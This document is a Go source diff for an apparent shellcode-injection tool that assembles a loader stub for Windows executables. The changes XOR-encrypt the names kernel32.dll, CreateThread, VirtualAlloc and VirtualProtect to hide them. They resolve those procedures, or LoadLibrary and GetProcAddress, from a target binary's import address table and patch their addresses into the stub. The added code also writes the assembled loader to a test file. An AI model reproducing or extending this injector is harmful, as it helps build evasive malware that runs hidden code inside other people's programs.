@@ -7,6 +7,7 @@ import (
 	"encoding/hex"
 	"errors"
 	"fmt"
+	"os"
 	"strconv"
 	"strings"
 	"text/template"
@@ -71,17 +72,24 @@ type loaderCtx struct {
 	LoadLibraryWOnly   bool
 
 	// encrypt the data in segments using xor
-	Kernel32DLL       []int64
+	Kernel32DLLDB     []int64
 	Kernel32DLLKey    []int64
-	CreateThread      []int64
+	CreateThreadDB    []int64
 	CreateThreadKey   []int64
-	VirtualAlloc      []int64
+	VirtualAllocDB    []int64
 	VirtualAllocKey   []int64
-	VirtualProtect    []int64
+	VirtualProtectDB  []int64
 	VirtualProtectKey []int64
+
+	// for replace stub in loader
+	LoadLibrary    uint64
+	GetProcAddress uint64
+	CreateThread   uint64
+	VirtualAlloc   uint64
+	VirtualProtect uint64
 }
 
-func (inj *Injector) buildShellcodeLoader() ([]byte, error) {
+func (inj *Injector) buildLoader() ([]byte, error) {
 	// initialize keystone engine
 	err := inj.initAssembler()
 	if err != nil {
@@ -113,7 +121,7 @@ func (inj *Injector) buildShellcodeLoader() ([]byte, error) {
 		RegV: inj.buildVolatileRegisterMap(),
 		RegS: inj.buildStableRegisterMap(),
 	}
-	err = inj.checkProcIsExist(ctx)
+	err = inj.findProcFromIAT(ctx)
 	if err != nil {
 		return nil, err
 	}
@@ -125,7 +133,10 @@ func (inj *Injector) buildShellcodeLoader() ([]byte, error) {
 		return nil, fmt.Errorf("failed to build assembly source: %s", err)
 	}
 	fmt.Println(buf.String())
-	return inj.assemble(buf.String())
+	inst, err := inj.assemble(buf.String())
+	inst = bytes.ReplaceAll(inst, separator, nil)
+	os.WriteFile("testdata/loader.bin", inst, 0600)
+	return inst, err
 }
 
 func (inj *Injector) initAssembler() error {
@@ -219,44 +230,49 @@ func (inj *Injector) selectRegister() string {
 	return reg
 }
 
-func (inj *Injector) checkProcIsExist(ctx *loaderCtx) error {
+func (inj *Injector) findProcFromIAT(ctx *loaderCtx) error {
 	CreateThread := inj.getProcFromIAT("CreateThread")
 	VirtualAlloc := inj.getProcFromIAT("VirtualAlloc")
 	VirtualProtect := inj.getProcFromIAT("VirtualProtect")
 	var lackProcedure bool
-	if CreateThread == nil {
-		lackProcedure = true
+	if CreateThread != nil {
+		ctx.CreateThread = CreateThread.addr
+	} else {
 		ctx.LackCreateThread = true
-	}
-	if VirtualAlloc == nil {
 		lackProcedure = true
+	}
+	if VirtualAlloc != nil {
+		ctx.VirtualAlloc = VirtualAlloc.addr
+	} else {
 		ctx.LackVirtualAlloc = true
-	}
-	if VirtualProtect == nil {
 		lackProcedure = true
+	}
+	if VirtualProtect != nil {
+		ctx.VirtualProtect = VirtualProtect.addr
+	} else {
 		ctx.LackVirtualProtect = true
+		lackProcedure = true
 	}
 	ctx.LackProcedure = lackProcedure
-	if lackProcedure {
-		LoadLibraryA := inj.getProcFromIAT("LoadLibraryA")
-		LoadLibraryW := inj.getProcFromIAT("LoadLibraryW")
-		GetProcAddress := inj.getProcFromIAT("GetProcAddress")
-		if LoadLibraryA == nil && LoadLibraryW == nil {
-			return errors.New("proc LoadLibrary is not exist in IAT")
-		}
-		if GetProcAddress == nil {
-			return errors.New("proc GetProcAddress is not exist in IAT")
-		}
-		if LoadLibraryA == nil {
-			ctx.LoadLibraryWOnly = true
-		}
-		inj.procLoadLibraryA = LoadLibraryA
-		inj.procLoadLibraryW = LoadLibraryW
-		inj.procGetProcAddress = GetProcAddress
+	if !lackProcedure {
+		return nil
 	}
-	inj.procCreateThread = CreateThread
-	inj.procVirtualAlloc = VirtualAlloc
-	inj.procVirtualProtect = VirtualProtect
+	LoadLibraryA := inj.getProcFromIAT("LoadLibraryA")
+	LoadLibraryW := inj.getProcFromIAT("LoadLibraryW")
+	GetProcAddress := inj.getProcFromIAT("GetProcAddress")
+	if LoadLibraryA == nil && LoadLibraryW == nil {
+		return errors.New("proc LoadLibrary is not exist in IAT")
+	}
+	if GetProcAddress == nil {
+		return errors.New("proc GetProcAddress is not exist in IAT")
+	}
+	if LoadLibraryA != nil {
+		ctx.LoadLibrary = LoadLibraryA.addr
+	} else {
+		ctx.LoadLibrary = LoadLibraryW.addr
+		ctx.LoadLibraryWOnly = true
+	}
+	ctx.GetProcAddress = GetProcAddress.addr
 	return nil
 }
 
@@ -271,10 +287,10 @@ func (inj *Injector) getProcFromIAT(proc string) *iat {
 
 func (inj *Injector) buildProcNames(ctx *loaderCtx) {
 	isUTF16 := ctx.LoadLibraryWOnly
-	ctx.Kernel32DLL, ctx.Kernel32DLLKey = inj.buildProcName("kernel32.dll", isUTF16)
-	ctx.CreateThread, ctx.CreateThreadKey = inj.buildProcName("CreateThread", isUTF16)
-	ctx.VirtualAlloc, ctx.VirtualAllocKey = inj.buildProcName("VirtualAlloc", isUTF16)
-	ctx.VirtualProtect, ctx.VirtualProtectKey = inj.buildProcName("VirtualProtect", isUTF16)
+	ctx.Kernel32DLLDB, ctx.Kernel32DLLKey = inj.buildProcName("kernel32.dll", isUTF16)
+	ctx.CreateThreadDB, ctx.CreateThreadKey = inj.buildProcName("CreateThread", isUTF16)
+	ctx.VirtualAllocDB, ctx.VirtualAllocKey = inj.buildProcName("VirtualAlloc", isUTF16)
+	ctx.VirtualProtectDB, ctx.VirtualProtectKey = inj.buildProcName("VirtualProtect", isUTF16)
 }
 
 func (inj *Injector) buildProcName(name string, isUTF16 bool) ([]int64, []int64) {
